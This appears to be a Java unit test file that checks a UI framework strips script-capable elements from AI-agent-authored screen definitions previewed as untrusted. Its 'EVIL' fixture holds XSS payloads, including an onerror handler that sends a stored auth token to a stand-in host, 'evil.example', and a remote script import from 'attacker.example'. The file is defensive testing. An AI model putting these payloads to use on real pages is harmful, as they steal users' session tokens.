package io.mateu.core.application;

import static org.assertj.core.api.Assertions.assertThat;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import io.mateu.core.application.runaction.UntrustedDefinition;
import io.mateu.core.infra.WireMapper;
import io.mateu.core.testutil.TestMateu;
import io.mateu.dtos.RunActionRqDto;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.HashMap;
import java.util.Map;
import org.junit.jupiter.api.Test;

/**
 * NB1: a screen an AGENT authored is untrusted — the shells render it through {@code __preview__}
 * with {@code _untrusted: true}, and nothing in what comes back can run script in the user's tab.
 * The rules are the shared cases of {@code conformance/untrusted/cases.json} (also run by .NET,
 * Python, libs/mateu and Redwood).
 */
class UntrustedPreviewSyncTest {

  private static final ObjectMapper JSON = WireMapper.shared();

  static Path corpusFile() {
    var dir = Path.of(System.getProperty("user.dir")).toAbsolutePath();
    while (dir != null && !Files.isDirectory(dir.resolve("conformance"))) dir = dir.getParent();
    return dir.resolve("conformance/untrusted/cases.json");
  }

  @Test
  void theSharedCasesHold() throws Exception {
    var corpus = JSON.readTree(Files.readString(corpusFile()));
    assertThat(corpus.get("cases").size()).isGreaterThan(5);
    for (JsonNode c : corpus.get("cases")) {
      assertThat(UntrustedDefinition.neutralize(c.get("input")))
          .as(c.get("name").asText())
          .isEqualTo(c.get("expected"));
    }
  }

  private static final String EVIL =
      """
      type: VerticalLayout
      content:
        - type: Text
          text: "Generated by the agent"
        - type: Element
          name: img
          attributes:
            src: x.png
            onerror: "fetch('https://evil.example/'+localStorage.__mateu_auth_token)"
            import: https://attacker.example/x.js
        - type: Element
          name: div
          html: true
          content: "<img src=x onerror=alert(1)>"
        - type: Element
          name: script
          content: alert(1)
      """;

  private static RunActionRqDto preview(String yaml, boolean untrusted) {
    var parameters = new HashMap<String, Object>();
    parameters.put("_yaml", yaml);
    if (untrusted) parameters.put("_untrusted", true);
    return RunActionRqDto.builder()
        .route("")
        .consumedRoute("")
        .actionId("__preview__")
        .initiatorComponentId("content")
        .componentState(Map.of())
        .parameters(parameters)
        .build();
  }

  @Test
  void anUntrustedPreviewKeepsNothingScriptCapableAndRendersTheRest() {
    try (var mateu = TestMateu.withUis()) {
      var wire = JSON.valueToTree(mateu.run(preview(EVIL, true))).toString();
      assertThat(wire).contains("Generated by the agent").contains("x.png");
      assertThat(wire)
          .doesNotContain("\"onerror\"")
          .doesNotContain("attacker.example")
          .doesNotContain("\"script\"")
          .doesNotContain("\"html\":true");
    }
  }

  @Test
  void theAuthorsOwnPreviewRendersAsWritten() {
    try (var mateu = TestMateu.withUis()) {
      var wire = JSON.valueToTree(mateu.run(preview(EVIL, false))).toString();
      assertThat(wire).contains("onerror").contains("\"html\":true");
    }
  }

  private static final String BENIGN =
      """
      type: VerticalLayout
      content:
        - type: Text
          text: "Hi"
        - type: FormField
          id: email
          dataType: string
          label: "Email"
          required: true
        - type: Button
          label: "Save"
          actionId: "save"
        - type: Card
          title: "A card"
          content:
            - type: Badge
              text: "ok"
        - type: Grid
          id: g
          columns:
            - type: GridColumn
              id: name
              label: Name
      """;

  @Test
  void aDefinitionWithNothingToTakeOutComesBackIdentical() {
    try (var mateu = TestMateu.withUis()) {
      var ids = "\"id\":\"[0-9a-f-]{36}\"";
      var trusted = JSON.valueToTree(mateu.run(preview(BENIGN, false))).toString();
      var untrusted = JSON.valueToTree(mateu.run(preview(BENIGN, true))).toString();
      assertThat(untrusted.replaceAll(ids, "\"id\":\"x\""))
          .isEqualTo(trusted.replaceAll(ids, "\"id\":\"x\""));
    }
  }
}
